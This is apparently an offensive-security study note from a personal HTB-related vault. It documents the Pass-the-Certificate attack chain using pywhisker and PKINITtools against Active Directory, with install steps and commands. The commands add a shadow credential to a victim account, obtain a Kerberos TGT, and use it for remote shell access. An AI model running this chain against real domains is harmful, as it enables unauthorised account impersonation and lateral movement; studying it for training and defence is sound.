# pywhisker + PKINITtools (Pass-the-Certificate)

Two Python tools that together implement the **Pass-the-Certificate (PtC)** attack chain. pywhisker adds a shadow credential to an AD computer or user object, and PKINITtools (specifically `gettgtpkinit.py`) exchanges the resulting certificate for a Kerberos TGT, bypassing the need to know the account's password.

---

## What it enables

When you have GenericWrite or WriteProperty on an AD computer object (or `ms-DS-KeyCredentialLink`), you can add a shadow credential and then authenticate as that machine account using PKINIT (certificate-based Kerberos auth). This is particularly powerful for:
- Escalating from write access to a computer object to full machine account impersonation
- ADCS ESC8 NTLM relay chains (ntlmrelayx --adcs → certificate → TGT)

This technique doesn't require cracking anything, and the TGT gives you a proper Kerberos ticket usable with evil-winrm, smbclient -k, etc.

## Install

```bash
# pywhisker
git clone https://github.com/ShutdownRepo/pywhisker
cd pywhisker
pip3 install -r requirements.txt

# PKINITtools
git clone https://github.com/dirkjanm/PKINITtools
cd PKINITtools
pip3 install -r requirements.txt

# oscrypto version pin (prevents ValueError: required TLS connection info not available)
pip3 install oscrypto==1.3.0
```

## Usage

**Full PtC chain from Kali:**
```bash
# 1. Add shadow credential to a target object
# Requires write access to that object (check BloodHound for GenericWrite paths)
python3 pywhisker.py -d <domain> -u <your_user> -p <your_pass> \
  --target <victim_machine$> --action add
# Output: saves a .pfx file and prints its password

# 2. Get TGT via PKINIT
python3 gettgtpkinit.py <domain>/<victim_machine$> out.ccache \
  -cert-pfx <pfx_file> -pfx-pass <pfx_password>

# 3. Use the TGT
export KRB5CCNAME=out.ccache
evil-winrm -i <target> -r <domain>    # WinRM with Kerberos
smbclient -k -N //<target>/C$         # SMB with Kerberos (no password needed)
impacket-wmiexec -k <domain>/<machine$>@<target> --no-pass   # WMI
```

**List existing shadow credentials on an object:**
```bash
python3 pywhisker.py -d <domain> -u <user> -p <pass> --target <machine$> --action list
```

**Clean up (remove your shadow credential after use):**
```bash
python3 pywhisker.py -d <domain> -u <user> -p <pass> --target <machine$> --action remove --device-id <id>
```

> ⚠️ `oscrypto==1.3.0` pin is critical. Newer versions break gettgtpkinit.py with a `ValueError: required TLS connection info not available` error even when everything else is correct. Pin it first before running.

> 🔍 **Worth remembering:** the `KRB5CCNAME` environment variable is how Kerberos-aware tools (smbclient, evil-winrm, impacket) know which ticket cache to use. Always set it before running the follow-on tool, or the tool will look in the wrong place and fail silently.

## Where this applies in the vault

- [[Password Attacks (HTB Supplementary)#PA.17 Pass the Certificate (PtC)|PA.17]]
- [[Active Directory Methodology#Step 7: Pass-the-Certificate|AD Methodology, Phase 2 Step 7]]
- [[Secrets & Credentials (Decision Tree)#Got write access to an AD computer object|Decision Tree]]

🔁 [[Password Attacks (HTB Supplementary)#PA.17|PA.17]], [[Active Directory Methodology]]

#### Tags: #ModernTooling #pywhisker #PKINITtools #PassTheCertificate #PtC #PKINIT #Kerberos #ActiveDirectory #ADCS
